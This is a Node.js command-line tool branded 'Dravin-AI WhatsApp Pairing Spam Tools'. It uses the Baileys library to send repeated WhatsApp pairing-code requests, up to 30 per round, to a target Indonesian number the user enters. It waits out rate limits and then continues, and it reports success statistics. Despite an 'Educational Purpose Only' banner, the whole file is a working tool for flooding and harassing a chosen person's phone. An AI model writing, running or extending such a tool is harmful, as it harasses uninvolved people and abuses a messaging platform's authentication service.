const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const figlet = require("figlet");
const gradient = require("gradient-string");
const chalk = require("chalk").default;
const readline = require("readline");
const pino = require("pino");

const sleep = (ms, variation = 0) => new Promise(resolve => {
    setTimeout(resolve, ms + (variation ? Math.floor(Math.random() * variation) : 0));
});

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise(resolve => rl.question(text, ans => {
        rl.close();
        resolve(ans);
    }));
};

const typeEffect = async (text, delay = 10) => {
    for (const char of text) {
        process.stdout.write(char);
        await sleep(delay);
    }
    process.stdout.write('\n');
};

const validateNumber = (number) => {
    return /^62\d{9,13}$/.test(number);
};

const formatCode = (code) => {
    return code.match(/.{1,4}/g).join('-');
};

const prompt = (message) => {
    return chalk.cyan(' ┌─╼') + chalk.hex('#FF1493')('[DRAVIN') + chalk.hex('#FFA500')('⚡') + chalk.hex('#FF1493')('AI]') + '\n' +
           chalk.cyan(' └────╼') + ' ' + chalk.red('❯') + chalk.hex('#FFA500')('❯') + chalk.blue('❯') + ' ' +
           chalk.hex('#ADD8E6')(message);
};

const showBanner = async () => {
    console.clear();
    const banner = figlet.textSync("DRAVIN-AI", { font: "ANSI Shadow" });
    console.log(gradient.atlas.multiline(banner));
    await typeEffect(chalk.hex('#FF6EC7').bold("[⚡] WhatsApp Pairing Spam Tools v3 - Enhanced Edition"));
    await typeEffect(chalk.hex('#00FFFF')("══════════════════════════════════════════════════════════"));
    await typeEffect(chalk.hex('#00FF7F').bold("• Educational Purpose Only - Use at Your Own Risk"));
    await typeEffect(chalk.hex('#FFD700').bold("• Only Works for Indonesian Numbers (62 country code)"));
    await typeEffect(chalk.hex('#00FFFF')("══════════════════════════════════════════════════════════\n"));
};

async function initConnection() {
    console.log(chalk.yellow('Initializing connection...'));
    try {
        const { state } = await useMultiFileAuthState('./dravin_session');
        const conn = makeWASocket({
            logger: pino({ level: "silent" }),
            printQRInTerminal: false,
            auth: state,
            connectTimeoutMs: 60000,
            defaultQueryTimeoutMs: 0,
            keepAliveIntervalMs: 10000,
            emitOwnEvents: true,
            fireInitQueries: true,
            generateHighQualityLinkPreview: true,
            syncFullHistory: true,
            markOnlineOnConnect: true,
            browser: ["Dravin-AI", "Chrome", "3.0.0"],
            getMessage: async () => ({
                conversation: "Dravin-AI WhatsApp Tools"
            })
        });
        
        console.log(chalk.green('Connection established successfully!'));
        return conn;
    } catch (error) {
        console.log(chalk.red('Connection failed!'));
        console.error(chalk.red('Error details:'), error);
        process.exit(1);
    }
}

async function requestPairing(conn, number, attempt) {
    try {
        const start = Date.now();
        const code = await conn.requestPairingCode(number);
        const elapsed = ((Date.now() - start) / 1000).toFixed(2);
        
        return {
            success: true,
            code: formatCode(code),
            time: elapsed,
            attempt
        };
    } catch (error) {
        return {
            success: false,
            error: error.message,
            attempt
        };
    }
}

async function startSpam() {
    const conn = await initConnection();
    let lastNumber = '';
    let stats = { total: 0, success: 0, failed: 0 };

    while (true) {
        let targetNumber = '';
        if (lastNumber) {
            const reuse = await question(prompt(`Use previous number ${lastNumber}? (y/n): `));
            if (reuse.toLowerCase() === 'y') {
                targetNumber = lastNumber;
            }
        }
        
        if (!targetNumber) {
            targetNumber = await question(prompt('Enter target number (62xxxxxxxxxx): '));
            if (!validateNumber(targetNumber)) {
                console.log(chalk.red("\n⚠️ Invalid number format! Example: 6281234567890\n"));
                continue;
            }
            lastNumber = targetNumber;
        }

        const countInput = await question(prompt('Enter spam count (1-30): '));
        const spamCount = parseInt(countInput);
        
        if (isNaN(spamCount)) {
            console.log(chalk.red("\n⚠️ Please enter a valid number!\n"));
            continue;
        }
        
        if (spamCount < 1 || spamCount > 30) {
            console.log(chalk.red("\n⚠️ Count must be between 1 and 30!\n"));
            continue;
        }

        console.log(chalk.hex('#7FFFD4')(`\n🚀 Starting spam to ${targetNumber} (${spamCount} requests)...\n`));
        
        console.log(chalk.yellow('Processing requests...'));
        const results = [];
        
        for (let i = 0; i < spamCount; i++) {
            process.stdout.write(chalk.yellow(`Processing... (${i+1}/${spamCount})\r`));
            const result = await requestPairing(conn, targetNumber, i+1);
            results.push(result);
            
            if (!result.success && 
                (result.error.includes("rate limit") || result.error.includes("too many"))) {
                console.log(chalk.yellow(`\n⚠️ Rate limited, waiting 30 seconds...`));
                await sleep(30000);
            }
        }
        
        console.log('\n');
        console.log(chalk.hex('#00BFFF')("\n📊 Request Results:"));
        results.forEach(result => {
            if (result.success) {
                console.log(chalk.green(`[✓] ${result.attempt} → Code: ${chalk.yellow(result.code)} (${result.time}s)`));
            } else {
                console.log(chalk.red(`[✗] ${result.attempt} → Failed: ${result.error}`));
            }
        });
        
        const successCount = results.filter(r => r.success).length;
        stats.total += spamCount;
        stats.success += successCount;
        stats.failed += (spamCount - successCount);
        
        console.log(chalk.hex('#9370DB')("\n📈 Session Summary:"));
        console.log(chalk.hex('#98FB98')(`├─ Target: ${chalk.white(targetNumber)}`));
        console.log(chalk.hex('#98FB98')(`├─ Requests: ${chalk.white(spamCount)}`));
        console.log(chalk.hex('#98FB98')(`├─ Success: ${chalk.green(successCount)}`));
        console.log(chalk.hex('#98FB98')(`└─ Failed: ${chalk.red(spamCount - successCount)}`));
        
        console.log(chalk.hex('#FFA07A')("\n📊 Total Statistics:"));
        console.log(chalk.hex('#FFD700')(`├─ Total Requests: ${chalk.white(stats.total)}`));
        console.log(chalk.hex('#FFD700')(`├─ Total Success: ${chalk.green(stats.success)}`));
        console.log(chalk.hex('#FFD700')(`└─ Total Failed: ${chalk.red(stats.failed)}`));

        const continueSpam = await question(prompt("\n🔁 Continue spamming? (y/n): "));
        if (continueSpam.toLowerCase() !== 'y') break;
        
        console.log();
    }

    console.log(chalk.hex('#FF69B4')("\n✨ Thank you for using Dravin-AI Tools!"));
    console.log(chalk.hex('#00FA9A')("🔒 Remember to use responsibly!\n"));
    process.exit(0);
}

(async () => {
    await showBanner();
    await sleep(800);
    await typeEffect(chalk.hex('#F0E68C')("[⚙️] Initializing system..."));
    await sleep(1200);
    
    try {
        await startSpam();
    } catch (error) {
        console.error(chalk.red('\n[!] Critical Error:'), error);
        process.exit(1);
    }
})();
